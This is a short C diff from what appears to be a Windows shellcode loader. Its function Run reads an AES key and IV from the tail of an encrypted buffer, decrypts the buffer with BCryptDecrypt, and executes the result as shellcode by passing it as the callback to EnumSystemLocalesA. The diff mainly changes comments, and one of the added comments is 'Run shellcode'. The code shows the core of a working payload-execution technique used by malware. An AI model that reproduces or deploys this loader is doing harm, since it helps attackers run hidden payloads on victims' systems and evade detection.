@@ -31,6 +31,7 @@ void Run(PBYTE pbCipherText, DWORD cbCipherText)
     BYTE                    rgbIV[16] = {};
     BYTE                    rgbAES128Key[16] = {};
 
+	// Copy key and iv from the last 32 bytes of cipher text
     memcpy(rgbAES128Key, &pbCipherText[cbCipherText - 32], 16);
     memcpy(rgbIV, &pbCipherText[cbCipherText - 16], 16);
 
@@ -114,9 +115,7 @@ void Run(PBYTE pbCipherText, DWORD cbCipherText)
         goto Cleanup;
     }
 
-    ////
-    //// Get the output buffer size.
-    ////
+    // Get the output buffer size.
     if (!NT_SUCCESS(status = BCryptDecrypt(
         hKey,
         pbCipherText,
@@ -155,6 +154,7 @@ void Run(PBYTE pbCipherText, DWORD cbCipherText)
         goto Cleanup;
     }
 
+	// Run shellcode
     EnumSystemLocalesA((LOCALE_ENUMPROCA)pbRawData, 0);
 
 Cleanup:
